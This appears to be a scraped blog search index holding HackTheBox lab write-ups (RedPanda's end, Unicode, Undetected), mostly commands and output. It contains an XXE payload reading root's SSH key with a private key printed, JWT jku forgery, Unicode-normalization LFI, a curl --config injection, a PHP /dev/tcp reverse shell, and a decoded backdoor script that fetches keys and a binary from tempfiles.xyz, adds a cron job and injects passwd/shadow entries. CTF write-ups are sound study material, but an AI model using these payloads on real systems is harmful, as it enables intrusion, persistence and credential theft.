xml file.&amp;lt;!--?xml version=&quot;1.0&quot; ?--&amp;gt;&amp;lt;!DOCTYPE replace [&amp;lt;!ENTITY file SYSTEM &quot;file:///root/.ssh/id_rsa&quot;&amp;gt; ]&amp;gt;&amp;lt;credits&amp;gt; &amp;lt;author&amp;gt;damian&amp;lt;/author&amp;gt; &amp;lt;image&amp;gt; &amp;lt;uri&amp;gt;/../../../../../../../home/woodenk/cat.jpg&amp;lt;/uri&amp;gt; &amp;lt;ssh&amp;gt;&amp;amp;file;&amp;lt;/ssh&amp;gt; &amp;lt;views&amp;gt;0&amp;lt;/views&amp;gt; &amp;lt;/image&amp;gt; &amp;lt;totalviews&amp;gt;0&amp;lt;/totalviews&amp;gt;&amp;lt;/credits&amp;gt;We then find a random image on the internet, add the metadata field Artist via exiftool:┌──(bitis㉿workstation)-[~/Downloads]└─$ exiftool -Artist=&quot;../home/woodenk/tmp&quot; cat.jpeg 1 image files updatedWe can then curl the site with a custom user-agent which will point towards this image.curl http://10.129.69.48:8080 -H &quot;User-Agent: ||/../../../../../../../home/woodenk/cat.jpg&quot;The image will then be loaded, the artist field will then point towards our malicious xml file, which will then load in the ssh key of root:woodenk@redpanda:~$ cat tmp_creds.xml &amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&amp;lt;!--?xml version=&quot;1.0&quot; ?--&amp;gt;&amp;lt;!DOCTYPE replace&amp;gt;&amp;lt;credits&amp;gt; &amp;lt;author&amp;gt;damian&amp;lt;/author&amp;gt; &amp;lt;image&amp;gt; &amp;lt;uri&amp;gt;/../../../../../../../home/woodenk/cat.jpg&amp;lt;/uri&amp;gt; &amp;lt;ssh&amp;gt;-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJRwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=-----END OPENSSH PRIVATE KEY-----&amp;lt;/ssh&amp;gt; &amp;lt;views&amp;gt;6&amp;lt;/views&amp;gt; &amp;lt;/image&amp;gt; &amp;lt;totalviews&amp;gt;6&amp;lt;/totalviews&amp;gt;&amp;lt;/credits&amp;gt;We can now login as root via the ssh key. Rooted!" }, { "title": "Unicode writeup", "url": "/posts/Unicode/", "categories": "Writeup, HackTheBox", "tags": "medium-box, jwt, reversing", "date": "2022-07-17 15:00:00 +0200", "snippet": "SummaryThis box focuses on exploiting an authentication system using a jwt with an insecure jku parameter. After this, we can do unicode normalization to gain lfi, which will allow us to get a password. We can then get the root flag by reversing a python binary.FootholdWe start out by doing an nmap port scan:# Nmap 7.92 scan initiated Sat Mar 5 14:59:22 2022 as: nmap -sC -sV -Pn -o nmap/ini.txt 10.129.151.92Nmap scan report for 10.129.151.92Host is up (0.078s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 fd:a0:f7:93:9e:d3:cc:bd:c2:3c:7f:92:35:70:d7:77 (RSA)| 256 8b:b6:98:2d:fa:00:e5:e2:9c:8f:af:0f:44:99:03:b1 (ECDSA)|_ 256 c9:89:27:3e:91:cb:51:27:6f:39:89:36:10:41:df:7c (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-title: Hackmedia|_http-generator: Hugo 0.83.1|_http-trane-info: Problem with XML parsing of /evox/about|_http-server-header: nginx/1.18.0 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Sat Mar 5 14:59:33 2022 -- 1 IP address (1 host up) scanned in 10.57 secondsPort 80 and 22 are open. WE start by checking out their website hosted on port 80:We can then create a user and login.When we login, we can check our cookies and see that we are given a jwt for authentication. We can check out how this jwt is formed via jwt.io.As we can see, the jwt uses an rku, which is essentially a URL to somewhere on the website which contains a public key in JSON format that is used to validate the token.The rku fileWE can go to mkjwk to make our own public key, and then change the jwt in jwt.io so that the user field is admin, and the rku URL is http://hackmedia.htb/static/../redirect?url=10.10.14.13/jwks2.json:When we then use this jwt in our browser, we can see on our http server that the site is requesting our key, and using it to validate our jwt. This gives us access to the admin dashboard.In the dashboard we can request to see a report, however we are jsut informed that it is being prepared and to check back later. If we try to access other files than the pdf, we get told they do a lot of input filtering:Instead of trying to do lfi with the classic payloads starting with ../../../ and so on, we can do unicode normalization. More on this here. We use the unicode character ︰, which normalizes to .., we can bypass the filtering and we have lfi.If we read the file located at /etc/nginx/sites-available/default, we find that the web root is /home/code/app, and that a password is being taken from a file named db.yaml. There is also a directory named /home/code/coder. We can then read the file /home/code/coder/db.yamlWe can then login as the user code with the credentials: code:B3stC0d3r2021@@!Privilege escalationIf we run sudo -l, we can tell that we have sudo rights to /usr/bin/treport. This is a binary file, and íf we run it, we can tell that the binary uses curl to download a threat report from a URL that we can supply. If we download the binary, and then use pyinstxtractor to extract the pyc files from the binary, we can reverse the binary. I use pycdc.# Source Generated with Decompyle++# File: treport.pyc (Python 3.10)Unsupported opcode: &amp;lt;255&amp;gt;import osimport sysfrom datetime import datetimeimport reclass threat_report: def create(self):Unsupported opcode: &amp;lt;255&amp;gt; file_name = input(&#39;Enter the filename:&#39;) content = input(&#39;Enter the report:&#39;) # WARNING: Decompyle incomplete def list_files(self): file_list = os.listdir(&#39;/root/reports/&#39;) files_in_dir = &#39; &#39;.join((lambda .0: [ str(elem) for elem in .0 ])(file_list)) print(&#39;ALL THE THREAT REPORTS:&#39;) print(files_in_dir) def read_file(self):Unsupported opcode: &amp;lt;255&amp;gt; file_name = input(&#39;\\nEnter the filename:&#39;) # WARNING: Decompyle incomplete def download(self):Warning: block stack is not empty! now = datetime.now() current_time = now.strftime(&#39;%H_%M_%S&#39;) command_injection_list = [ &#39;$&#39;, &#39;`&#39;, &#39;;&#39;, &#39;&amp;amp;&#39;, &#39;|&#39;, &#39;||&#39;, &#39;&amp;gt;&#39;, &#39;&amp;lt;&#39;, &#39;?&#39;, &quot;&#39;&quot;, &#39;@&#39;, &#39;#&#39;, &#39;$&#39;, &#39;%&#39;, &#39;^&#39;, &#39;(&#39;, &#39;)&#39;] ip = input(&#39;Enter the IP/file_name:&#39;) res = bool(re.search(&#39;\\\\s&#39;, ip)) if res: print(&#39;INVALID IP&#39;) sys.exit(0) if &#39;file&#39; in ip and &#39;gopher&#39; in ip or &#39;mysql&#39; in ip: print(&#39;INVALID URL&#39;) sys.exit(0) for vars in command_injection_list: print(&#39;NOT ALLOWED&#39;) sys.exit(0) cmd = &#39;/bin/bash -c &quot;curl &#39; + ip + &#39; -o /root/reports/threat_report_&#39; + current_time + &#39;&quot;&#39; os.system(cmd) return None# WARNING: Decompyle incompleteAs we can see, there is a blacklist of symbols in the code, however we can use {} and ,. To get the root flag we can supply the ip {--config,/root/root.txt}. Since the root flag is not a valid config file for curl, it will print the contents to stdout while throwing errors. This can be used to read the flag:code@code:~$ sudo /usr/bin/treport 1.Create Threat Report.2.Read Threat Report.3.Download A Threat Report.4.Quit.Enter your choice:3Enter the IP/file_name:{--config,/root/root.txt}Warning: /root/root.txt:1: warning: &#39;ee93e256d4878cfc8759ffdb5711067c&#39; is Warning: unknowncurl: no URL specified!curl: try &#39;curl --help&#39; or &#39;curl --manual&#39; for more informationRooted!" }, { "title": "Undetected writeup", "url": "/posts/Undetected/", "categories": "Writeup, HackTheBox", "tags": "medium-box, reversing, php", "date": "2022-07-17 15:00:00 +0200", "snippet": "SummaryThis is a box that focuses on reversing a lot of files from a previous attacker who has been so kind as to leave his backdoors in place for us. Let’s take a look!FootholdWe start out by doing an nmap port scan:# Nmap 7.92 scan initiated Sat Mar 5 16:44:36 2022 as: nmap -sC -sV -p- -o nmap/full.txt 10.129.151.107Nmap scan report for 10.129.151.107Host is up (0.047s latency).Not shown: 65533 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2 (protocol 2.0)| ssh-hostkey: | 3072 be:66:06:dd:20:77:ef:98:7f:6e:73:4a:98:a5:d8:f0 (RSA)| 256 1f:a2:09:72:70:68:f4:58:ed:1f:6c:49:7d:e2:13:39 (ECDSA)|_ 256 70:15:39:94:c2:cd:64:cb:b2:3b:d1:3e:f6:09:44:e8 (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-title: Diana&#39;s Jewelry|_http-server-header: Apache/2.4.41 (Ubuntu)Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Sat Mar 5 16:44:53 2022 -- 1 IP address (1 host up) scanned in 17.44 secondsWe can start out by checking out port 80:It seems to be a jewelry store. If we add djewelry.htb to our host file and scan for vhosts we dont seem to find anything interesting. If we instead fuzz for directories we find a /vendor directory:┌──(bitis㉿workstation)-[~/Coding/BitisG.github.io]└─$ gobuster dir -u http://store.djewelry.htb -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt 2 ⨯===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://store.djewelry.htb[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Timeout: 10s===============================================================2022/07/17 17:35:27 Starting gobuster in directory enumeration mode===============================================================/.php (Status: 403) [Size: 283]/.html (Status: 403) [Size: 283]/images (Status: 301) [Size: 325] [--&amp;gt; http://store.djewelry.htb/images/]/js (Status: 301) [Size: 321] [--&amp;gt; http://store.djewelry.htb/js/] /css (Status: 301) [Size: 322] [--&amp;gt; http://store.djewelry.htb/css/] /.htm (Status: 403) [Size: 283] /. (Status: 200) [Size: 6215] /fonts (Status: 301) [Size: 324] [--&amp;gt; http://store.djewelry.htb/fonts/] /.htaccess (Status: 403) [Size: 283] /.phtml (Status: 403) [Size: 283] /vendor (Status: 301) [Size: 325] [--&amp;gt; http://store.djewelry.htb/vendor/]/.htc (Status: 403) [Size: 283] /.html_var_DE (Status: 403) [Size: 283] /server-status (Status: 403) [Size: 283] /.htpasswd (Status: 403) [Size: 283] /.html. (Status: 403) [Size: 283] /.html.html (Status: 403) [Size: 283] /.htpasswds (Status: 403) [Size: 283] /.htm. (Status: 403) [Size: 283] /.htmll (Status: 403) [Size: 283] /.phps (Status: 403) [Size: 283] /.html.old (Status: 403) [Size: 283] /.ht (Status: 403) [Size: 283] /.html.bak (Status: 403) [Size: 283] /.htm.htm (Status: 403) [Size: 283] /.hta (Status: 403) [Size: 283] /.html1 (Status: 403) [Size: 283] /.htgroup (Status: 403) [Size: 283] /.html.LCK (Status: 403) [Size: 283] /.html.printable (Status: 403) [Size: 283] We find that the web application uses phpunit, and that this version has a cveWe can then go to the endpoint http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php and achieve RCE:We can then use this to get a reverse shell on the target via the php code &amp;lt;?php system(&#39;/bin/bash -c &quot;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.17.182/1337 0&amp;gt;&amp;amp;1&quot;&#39;)?&amp;gt;──(bitis㉿workstation)-[~/Coding/BitisG.github.io]└─$ nc -lvnp 4444 listening on [any] 4444 ...connect to [10.10.14.57] from (UNKNOWN) [10.129.136.44] 60698bash: cannot set terminal process group (963): Inappropriate ioctl for devicebash: no job control in this shellwww-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ ididuid=33(www-data) gid=33(www-data) groups=33(www-data)www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ PivotRunning linpeas, we find an interesting file named /var/backups/info.We can download this file to our machine, and then run xxd on it.00003000: 0100 0200 0000 0000 5b2d 5d20 7365 7473 ........[-] sets00003010: 6f63 6b6f 7074 2850 4143 4b45 545f 5645 ockopt(PACKET_VE00003020: 5253 494f 4e29 0000 5b2d 5d20 7365 7473 RSION)..[-] sets00003030: 6f63 6b6f 7074 2850 4143 4b45 545f 5258 ockopt(PACKET_RX00003040: 5f52 494e 4729 005b 2d5d 2073 6f63 6b65 _RING).[-] socke00003050: 7428 4146 5f50 4143 4b45 5429 006c 6f00 t(AF_PACKET).lo.00003060: 5b2d 5d20 6269 6e64 2841 465f 5041 434b [-] bind(AF_PACK00003070: 4554 2900 5b2d 5d20 7365 6e64 746f 2853 ET).[-] sendto(S00003080: 4f43 4b5f 5241 5729 005b 2d5d 2073 6f63 OCK_RAW).[-] soc00003090: 6b65 7428 534f 434b 5f52 4157 2900 5b2d ket(SOCK_RAW).[-000030a0: 5d20 736f 636b 6574 2853 4f43 4b5f 4447 ] socket(SOCK_DG000030b0: 5241 4d29 0000 0000 5b2d 5d20 6b6c 6f67 RAM)....[-] klog000030c0: 6374 6c28 5359 534c 4f47 5f41 4354 494f ctl(SYSLOG_ACTIO000030d0: 4e5f 5349 5a45 5f42 5546 4645 5229 0000 N_SIZE_BUFFER)..000030e0: 5b2d 5d20 6b6c 6f67 6374 6c28 5359 534c [-] klogctl(SYSL000030f0: 4f47 5f41 4354 494f 4e5f 5245 4144 5f41 OG_ACTION_READ_A00003100: 4c4c 2900 4672 6565 696e 6720 534d 5000 LL).Freeing SMP.00003110: 5b2d 5d20 7375 6273 7472 696e 6720 2725 [-] substring &#39;%00003120: 7327 206e 6f74 2066 6f75 6e64 2069 6e20 s&#39; not found in 00003130: 646d 6573 670a 0066 6666 6600 2f62 696e dmesg..ffff./bin00003140: 2f62 6173 6800 2d63 0000 0000 0000 0000 /bash.-c........00003150: 3737 3637 3635 3734 3230 3734 3635 3664 776765742074656d00003160: 3730 3636 3639 3663 3635 3733 3265 3738 7066696c65732e7800003170: 3739 3761 3266 3631 3735 3734 3638 3666 797a2f617574686f00003180: 3732 3639 3761 3635 3634 3566 3662 3635 72697a65645f6b6500003190: 3739 3733 3230 3264 3466 3230 3266 3732 7973202d4f202f72000031a0: 3666 3666 3734 3266 3265 3733 3733 3638 6f6f742f2e737368000031b0: 3266 3631 3735 3734 3638 3666 3732 3639 2f617574686f7269000031c0: 3761 3635 3634 3566 3662 3635 3739 3733 7a65645f6b657973000031d0: 3362 3230 3737 3637 3635 3734 3230 3734 3b20776765742074000031e0: 3635 3664 3730 3636 3639 3663 3635 3733 656d7066696c6573000031f0: 3265 3738 3739 3761 3266 3265 3664 3631 2e78797a2f2e6d6100003200: 3639 3665 3230 3264 3466 3230 3266 3736 696e202d4f202f7600003210: 3631 3732 3266 3663 3639 3632 3266 3265 61722f6c69622f2e00003220: 3664 3631 3639 3665 3362 3230 3633 3638 6d61696e3b20636800003230: 3664 3666 3634 3230 3337 3335 3335 3230 6d6f64203735352000003240: 3266 3736 3631 3732 3266 3663 3639 3632 2f7661722f6c696200003250: 3266 3265 3664 3631 3639 3665 3362 3230 2f2e6d61696e3b2000003260: 3635 3633 3638 3666 3230 3232 3261 3230 6563686f20222a2000003270: 3333 3230 3261 3230 3261 3230 3261 3230 33202a202a202a2000003280: 3732 3666 3666 3734 3230 3266 3736 3631 726f6f74202f766100003290: 3732 3266 3663 3639 3632 3266 3265 3664 722f6c69622f2e6d000032a0: 3631 3639 3665 3232 3230 3365 3365 3230 61696e22203e3e20000032b0: 3266 3635 3734 3633 3266 3633 3732 3666 2f6574632f63726f000032c0: 3665 3734 3631 3632 3362 3230 3631 3737 6e7461623b206177000032d0: 3662 3230 3264 3436 3232 3361 3232 3230 6b202d46223a2220000032e0: 3237 3234 3337 3230 3364 3364 3230 3232 272437203d3d2022000032f0: 3266 3632 3639 3665 3266 3632 3631 3733 2f62696e2f62617300003300: 3638 3232 3230 3236 3236 3230 3234 3333 682220262620243300003310: 3230 3365 3364 3230 3331 3330 3330 3330 203e3d203130303000003320: 3230 3762 3733 3739 3733 3734 3635 3664 207b73797374656d00003330: 3238 3232 3635 3633 3638 3666 3230 3232 28226563686f202200003340: 3234 3331 3232 3331 3361 3563 3234 3336 243122313a5c243600003350: 3563 3234 3761 3533 3337 3739 3662 3438 5c247a5337796b4800003360: 3636 3436 3464 3637 3333 3631 3539 3638 66464d673361596800003370: 3734 3334 3563 3234 3331 3439 3535 3732 74345c243149557200003380: 3638 3561 3631 3665 3532 3735 3434 3561 685a616e5275445a00003390: 3638 3636 3331 3666 3439 3634 3665 3666 6866316f49646e6f000033a0: 3466 3736 3538 3666 3666 3663 3462 3664 4f76586f6f6c4b6d000033b0: 3663 3737 3632 3662 3635 3637 3432 3538 6c77626b65674258000033c0: 3662 3265 3536 3734 3437 3637 3337 3338 6b2e567447673738000033d0: 3635 3463 3337 3537 3432 3464 3336 3466 654c3757424d364f000033e0: 3732 3465 3734 3437 3632 3561 3738 3462 724e7447625a784b000033f0: 3432 3734 3530 3735 3338 3535 3636 3664 427450753855666d00003400: 3339 3638 3464 3330 3532 3266 3432 3463 39684d30522f424c00003410: 3634 3431 3433 3666 3531 3330 3534 3339 6441436f5130543900003420: 3665 3266 3361 3331 3338 3338 3331 3333 6e2f3a313838313300003430: 3361 3330 3361 3339 3339 3339 3339 3339 3a303a393939393900003440: 3361 3337 3361 3361 3361 3230 3365 3365 3a373a3a3a203e3e00003450: 3230 3266 3635 3734 3633 3266 3733 3638 202f6574632f736800003460: 3631 3634 3666 3737 3232 3239 3764 3237 61646f7722297d2700003470: 3230 3266 3635 3734 3633 3266 3730 3631 202f6574632f706100003480: 3733 3733 3737 3634 3362 3230 3631 3737 737377643b20617700003490: 3662 3230 3264 3436 3232 3361 3232 3230 6b202d46223a2220000034a0: 3237 3234 3337 3230 3364 3364 3230 3232 272437203d3d2022000034b0: 3266 3632 3639 3665 3266 3632 3631 3733 2f62696e2f626173000034c0: 3638 3232 3230 3236 3236 3230 3234 3333 6822202626202433000034d0: 3230 3365 3364 3230 3331 3330 3330 3330 203e3d2031303030000034e0: 3230 3762 3733 3739 3733 3734 3635 3664 207b73797374656d000034f0: 3238 3232 3635 3633 3638 3666 3230 3232 28226563686f202200003500: 3234 3331 3232 3230 3232 3234 3333 3232 243122202224332200003510: 3230 3232 3234 3336 3232 3230 3232 3234 202224362220222400003520: 3337 3232 3230 3365 3230 3735 3733 3635 3722203e2075736500003530: 3732 3733 3265 3734 3738 3734 3232 3239 72732e747874222900003540: 3764 3237 3230 3266 3635 3734 3633 3266 7d27202f6574632f00003550: 3730 3631 3733 3733 3737 3634 3362 3230 7061737377643b2000003560: 3737 3638 3639 3663 3635 3230 3732 3635 7768696c6520726500003570: 3631 3634 3230 3264 3732 3230 3735 3733 6164202d7220757300003580: 3635 3732 3230 3637 3732 3666 3735 3730 65722067726f757000003590: 3230 3638 3666 3664 3635 3230 3733 3638 20686f6d65207368000035a0: 3635 3663 3663 3230 3566 3362 3230 3634 656c6c205f3b2064000035b0: 3666 3230 3635 3633 3638 3666 3230 3232 6f206563686f2022000035c0: 3234 3735 3733 3635 3732 3232 3331 3232 2475736572223122000035d0: 3361 3738 3361 3234 3637 3732 3666 3735 3a783a2467726f75000035e0: 3730 3361 3234 3637 3732 3666 3735 3730 703a2467726f7570000035f0: 3361 3263 3263 3263 3361 3234 3638 3666 3a2c2c2c3a24686f00003600: 3664 3635 3361 3234 3733 3638 3635 3663 6d653a247368656c00003610: 3663 3232 3230 3365 3365 3230 3266 3635 6c22203e3e202f6500003620: 3734 3633 3266 3730 3631 3733 3733 3737 74632f706173737700003630: 3634 3362 3230 3634 3666 3665 3635 3230 643b20646f6e652000003640: 3363 3230 3735 3733 3635 3732 3733 3265 3c2075736572732e00003650: 3734 3738 3734 3362 3230 3732 3664 3230 7478743b20726d2000003660: 3735 3733 3635 3732 3733 3265 3734 3738 75736572732e747800003670: 3734 3362 005b 2d5d 2066 6f72 6b28 2900 743b.[-] fork().00003680: 2f65 7463 2f73 6861 646f 7700 5b2e 5d20 /etc/shadow.[.] 00003690: 6368 6563 6b69 6e67 2069 6620 7765 2067 checking if we g000036a0: 6f74 2072 6f6f 7400 5b2d 5d20 736f 6d65 ot root.[-] some000036b0: 7468 696e 6720 7765 6e74 2077 726f 6e67 thing went wrong000036c0: 203d 2800 5b2b 5d20 676f 7420 7230 3074 =(.[+] got r00t000036d0: 205e 5f5e 005b 2d5d 2075 6e73 6861 7265 ^_^.[-] unshare000036e0: 2843 4c4f 4e45 5f4e 4557 5553 4552 2900 (CLONE_NEWUSER).000036f0: 6465 6e79 002f 7072 6f63 2f73 656c 662f deny./proc/self/00003700: 7365 7467 726f 7570 7300 0000 0000 0000 setgroups.......00003710: 5b2d 5d20 7772 6974 655f 6669 6c65 282f [-] write_file(/00003720: 7072 6f63 2f73 656c 662f 7365 745f 6772 proc/self/set_gr00003730: 6f75 7073 2900 3020 2564 2031 0a00 2f70 oups).0 %d 1../p00003740: 726f 632f 7365 6c66 2f75 6964 5f6d 6170 roc/self/uid_map00003750: 0000 0000 0000 0000 5b2d 5d20 7772 6974 ........[-] writ00003760: 655f 6669 6c65 282f 7072 6f63 2f73 656c e_file(/proc/sel00003770: 662f 7569 645f 6d61 7029 002f 7072 6f63 f/uid_map)./proc00003780: 2f73 656c 662f 6769 645f 6d61 7000 0000 /self/gid_map...00003790: 5b2d 5d20 7772 6974 655f 6669 6c65 282f [-] write_file(/000037a0: 7072 6f63 2f73 656c 662f 6769 645f 6d61 proc/self/gid_ma000037b0: 7029 005b 2d5d 2073 6368 6564 5f73 6574 p).[-] sched_set000037c0: 6166 6669 6e69 7479 2829 002f 7362 696e affinity()./sbin000037d0: 2f69 6663 6f6e 6669 6720 6c6f 2075 7000 /ifconfig lo up.000037e0: 5b2d 5d20 7379 7374 656d 282f 7362 696e [-] system(/sbin000037f0: 2f69 6663 6f6e 6669 6720 6c6f 2075 7029 /ifconfig lo up)00003800: 005b 2e5d 2073 7461 7274 696e 6700 5b2e .[.] starting.[.00003810: 5d20 6e61 6d65 7370 6163 6520 7361 6e64 ] namespace sand00003820: 626f 7820 7365 7420 7570 0000 0000 0000 box set up......00003830: 5b2e 5d20 4b41 534c 5220 6279 7061 7373 [.] KASLR bypass00003840: 2065 6e61 626c 6564 2c20 6765 7474 696e enabled, gettin00003850: 6720 6b65 726e 656c 2061 6464 7200 5b2e g kernel addr.[.00003860: 5d20 646f 6e65 2c20 6b65 726e 656c 2074 ] done, kernel t00003870: 6578 743a 2020 2025 6c78 0a00 5b2e 5d20 ext: %lx..[.] 00003880: 636f 6d6d 6974 5f63 7265 6473 3a20 2020 commit_creds: 00003890: 2020 2020 2025 6c78 0a00 5b2e 5d20 7072 %lx..[.] pr000038a0: 6570 6172 655f 6b65 726e 656c 5f63 7265 epare_kernel_cre000038b0: 643a 2025 6c78 0a00 5b2e 5d20 6e61 7469 d: %lx..[.] nati000038c0: 7665 5f77 7269 7465 5f63 7234 3a20 2020 ve_write_cr4: 000038d0: 2025 6c78 0a00 5b2e 5d20 7061 6464 696e %lx..[.] paddin000038e0: 6720 6865 6170 005b 2e5d 2064 6f6e 652c g heap.[.] done,000038f0: 2068 6561 7020 6973 2070 6164 6465 6400 heap is padded.00003900: 5b2e 5d20 534d 4550 2026 2053 4d41 5020 [.] SMEP &amp;amp; SMAP 00003910: 6279 7061 7373 2065 6e61 626c 6564 2c20 bypass enabled, 00003920: 7475 726e 696e 6720 7468 656d 206f 6666 turning them off00003930: 0000 0000 0000 0000 5b2e 5d20 646f 6e65 ........[.] done00003940: 2c20 534d 4550 2026 2053 4d41 5020 7368 , SMEP &amp;amp; SMAP sh00003950: 6f75 6c64 2062 6520 6f66 6620 6e6f 7700 ould be off now.00003960: 5b2e 5d20 6578 6563 7574 696e 6720 6765 [.] executing ge00003970: 7420 726f 6f74 2070 6179 6c6f 6164 2025 t root payload %00003980: 700a 005b 2e5d 2064 6f6e 652c 2073 686f p..[.] done, sho00003990: 756c 6420 6265 2072 6f6f 7420 6e6f 7700 uld be root now.It seems to be an exploit. If we import it to cyberchef we can decode the hexcodes in the file:wget tempfiles.xyz/authorized_keys -O /root/.ssh/authorized_keys; wget tempfiles.xyz/.main -O /var/lib/.main; chmod 755 /var/lib/.main; echo &quot;* 3 * * * root /var/lib/.main&quot; &amp;gt;&amp;gt; /etc/crontab; awk -F&quot;:&quot; &#39;$7 == &quot;/bin/bash&quot; &amp;amp;&amp;amp; $3 &amp;gt;= 1000 {system(&quot;echo &quot;$1&quot;1:\\$6\\$zS7ykHfFMg3aYht4\\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: &amp;gt;&amp;gt; /etc/shadow&quot;)}&#39; /etc/passwd; awk -F&quot;:&quot; &#39;$7 == &quot;/bin/bash&quot; &amp;amp;&amp;amp; $3 &amp;gt;= 1000 {system(&quot;echo &quot;$1&quot; &quot;$3&quot; &quot;$6&quot; &quot;$7&quot; &amp;gt; users.txt&quot;)}&#39; /etc/passwd; while read -r user group home shell _; do echo &quot;$user&quot;1&quot;:x:$group:$group:,,,:$home:$shell&quot; &amp;gt;&amp;gt; /etc/passwd; done &amp;lt; users.txt; rm users.txWe can crack the hash with john to be ihatehackers. We can then login as the user steven1 with this password.Privilege escalationIf we enter the /etc/apache2/mods-enabled/ directory, we find a file that has been modified at a much different date than the rest:steven@production:/etc/apache2/mods-enabled$ ls -altotal 8drwxr-xr-x 2 root root 4096 Feb 8 19:59 .drwxr-xr-x 8 root root 4096 Feb 8 19:59 ..lrwxrwxrwx 1 root root 36 Jul 4 2021 access_compat.load -&amp;gt; ../mods-available/access_compat.loadlrwxrwxrwx 1 root root 28 Jul 4 2021 alias.conf -&amp;gt; ../mods-available/alias.conflrwxrwxrwx 1 root root 28 Jul 4 2021 alias.load -&amp;gt; ../mods-available/alias.loadlrwxrwxrwx 1 root root 33 Jul 4 2021 auth_basic.load -&amp;gt; ../mods-available/auth_basic.loadlrwxrwxrwx 1 root root 33 Jul 4 2021 authn_core.load -&amp;gt; ../mods-available/authn_core.loadlrwxrwxrwx 1 root root 33 Jul 4 2021 authn_file.load -&amp;gt; ../mods-available/authn_file.loadlrwxrwxrwx 1 root root 33 Jul 4 2021 authz_core.load -&amp;gt; ../mods-available/authz_core.loadlrwxrwxrwx 1 root root 33 Jul 4 2021 authz_host.load -&amp;gt; ../mods-available/authz_host.loadlrwxrwxrwx 1 root root 33 Jul 4 2021 authz_user.load -&amp;gt; ../mods-available/authz_user.loadlrwxrwxrwx 1 root root 32 Jul 5 2021 autoindex.conf -&amp;gt; ../mods-available/autoindex.conflrwxrwxrwx 1 root root 32 Jul 5 2021 autoindex.load -&amp;gt; ../mods-available/autoindex.loadlrwxrwxrwx 1 root root 30 Jul 4 2021 deflate.conf -&amp;gt; ../mods-available/deflate.conflrwxrwxrwx 1 root root 30 Jul 4 2021 deflate.load -&amp;gt; ../mods-available/deflate.loadlrwxrwxrwx 1 root root 26 Jul 4 2021 dir.conf -&amp;gt; ../mods-available/dir.conflrwxrwxrwx 1 root root 26 Jul 4 2021 dir.load -&amp;gt; ../mods-available/dir.loadlrwxrwxrwx 1 root root 26 Jul 4 2021 env.load -&amp;gt; ../mods-available/env.loadlrwxrwxrwx 1 root root 29 Jul 4 2021 filter.load -&amp;gt; ../mods-available/filter.loadlrwxrwxrwx 1 root root 27 Jul 4 2021 mime.conf -&amp;gt; ../mods-available/mime.conflrwxrwxrwx 1 root root 27 Jul 4 2021 mime.load -&amp;gt; ../mods-available/mime.loadlrwxrwxrwx 1 root root 34 Jul 4 2021 mpm_prefork.conf -&amp;gt; ../mods-available/mpm_prefork.conflrwxrwxrwx 1 root root 34 Jul 4 2021 mpm_prefork.load -&amp;gt; ../mods-available/mpm_prefork.loadlrwxrwxrwx 1 root root 34 Jul 4 2021 negotiation.conf -&amp;gt; ../mods-available/negotiation.conflrwxrwxrwx 1 root root 34 Jul 4 2021 negotiation.load -&amp;gt; ../mods-available/negotiation.loadlrwxrwxrwx 1 root root 29 Jul 4 2021 php7.4.conf -&amp;gt; ../mods-available/php7.4.conflrwxrwxrwx 1 root root 29 Jul 4 2021 php7.4.load -&amp;gt; ../mods-available/php7.4.loadlrwxrwxrwx 1 root root 29 May 17 2021 reader.load -&amp;gt; ../mods-available/reader.loadlrwxrwxrwx 1 root root 33 Jul 4 2021 reqtimeout.conf -&amp;gt; ../mods-available/reqtimeout.conflrwxrwxrwx 1 root root 33 Jul 4 2021 reqtimeout.load -&amp;gt; ../mods-available/reqtimeout.loadlrwxrwxrwx 1 root root 31 Jul 4 2021 setenvif.conf -&amp;gt; ../mods-available/setenvif.conflrwxrwxrwx 1 root root 31 Jul 4 2021 setenvif.load -&amp;gt; ../mods-available/setenvif.loadlrwxrwxrwx 1 root root 29 Jul 4 2021 status.conf -&amp;gt; ../mods-available/status.conflrwxrwxrwx 1 root root 29 Jul 4 2021 status.load -&amp;gt; ../mods-available/status.loadÀs we can see, read.load was modified on May 17, while the rest was modified July 4th. If we check out the file it is symlinked to, we find out the mod is actually loading the file /usr/lib/apache2/modules/mod_reader.so.We can then download this file to our machine.analyzing the file with ghidra, we find a suspicious function with a base64 encoded string.Decoding this string results in:┌──(bitis㉿workstation)-[~/htb/Machines/undetected]└─$ echo 